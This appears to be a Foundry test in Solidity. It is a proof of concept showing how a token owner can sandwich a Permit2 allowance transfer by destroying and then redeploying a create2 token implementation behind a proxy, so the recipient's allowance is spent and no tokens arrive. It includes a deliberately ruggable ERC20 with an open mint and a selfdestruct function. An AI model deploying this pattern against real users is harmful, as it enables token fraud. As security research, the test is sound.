// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {Permit2} from "../src/Permit2.sol";

import {ERC20} from "solmate/tokens/ERC20.sol";

import {TransparentUpgradeableProxy} from
    "openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {Create2} from "openzeppelin-contracts/contracts/utils/Create2.sol";

contract AllowanceTransferRugTest is Test {
    Permit2 permit2;

    RuggableERC20 token;
    address impl;

    address alice = address(0xCAFE);
    address eve = address(0xDEAD);
    address eveProxyAdmin = address(0xDEAD2);

    function setUp() public {
        permit2 = new Permit2();

        // Eve deploys the token implementation via create2.
        // This enables her not having to change the proxy's implementation
        // after a redeployment.
        vm.prank(eve);
        impl = Create2.deploy(uint256(0), bytes32("salt"), type(RuggableERC20).creationCode);

        // The token itself is managed via a proxy to not delete the token's
        // storage after a redeploy.
        token = RuggableERC20(
            address(
                new TransparentUpgradeableProxy({
                _logic: impl,
                admin_: eveProxyAdmin,
                _data: bytes("")
                })
            )
        );

        // Eve holds a bunch of tokens.
        token.mint(eve, 1_000e18);

        // Eve enables Permit2 and approves tokens to Alice via Permit2's
        // AllowanceTransfer functionality.
        vm.startPrank(eve);
        {
            token.approve(address(permit2), type(uint256).max);
            permit2.approve(address(token), alice, 1_000e18, type(uint48).max);
        }
        vm.stopPrank();
    }

    // This function should be executed via a private mempool, enabling Eve to
    // deterministically sandwich Alice's allowance.
    function testAllowanceRugSandwich() public {
        // Eve destroys the token implementation contract.
        _destroyTokenImplementation();

        // Alice spends allowance (without receiving tokens).
        vm.prank(alice);
        permit2.transferFrom(eve, alice, 1_000e18, address(token));

        // Eve redeploys the token implementation.
        _redeployTokenImplementation();

        // Token exists and it's storage did not change.
        assertEq(token.balanceOf(eve), 1_000e18);

        // Alice spent her Permit2 allowance...
        (uint160 amount, /*expiration*/, /*nonce*/ ) = permit2.allowance(eve, address(token), alice);
        assertEq(amount, 0);

        // ...without having received any tokens.
        assertEq(token.balanceOf(alice), 0);
    }

    function _destroyTokenImplementation() internal {
        // Note that selfdestruct is executed at the end of a tx while a foundry
        // test is always executed in one tx (see Issue [1543](https://github.com/foundry-rs/foundry/issues/1543)).
        //
        // To simulate the selfdestruct, we set the proxy's implementation to an
        // "empty" contract. However, OZ disallows setting the implementation to an
        // EOA, i.e. contract with no code.
        //
        // To simulate a contract with no code the "empty" contract only
        // implements an empty fallback.
        address empty = address(new Empty());

        vm.prank(eveProxyAdmin);
        TransparentUpgradeableProxy(payable(address(token))).upgradeTo(empty);

        // Real call would be:
        // vm.prank(eve);
        // token.destroy();
    }

    function _redeployTokenImplementation() internal {
        // Note to just change the token's implementation back to the real
        // implementation. This is due to foundry's missing feature of being
        // able to test selfdestruct.
        vm.prank(eveProxyAdmin);
        TransparentUpgradeableProxy(payable(address(token))).upgradeTo(impl);

        // Real call would be:
        // vm.prank(eve);
        // Create2.deploy(uint256(0), bytes32("salt"), type(RuggableERC20).creationCode);
    }
}

contract RuggableERC20 is ERC20 {
    address public owner;

    constructor() ERC20("Ruggable", "RUG", uint8(18)) {
        owner = msg.sender;
    }

    // Should of course not be publicly callable outside of PoC.
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function destroy() external {
        require(msg.sender == owner, "!owner");
        selfdestruct(payable(msg.sender));
    }
}

contract Empty {
    fallback() external {}
}
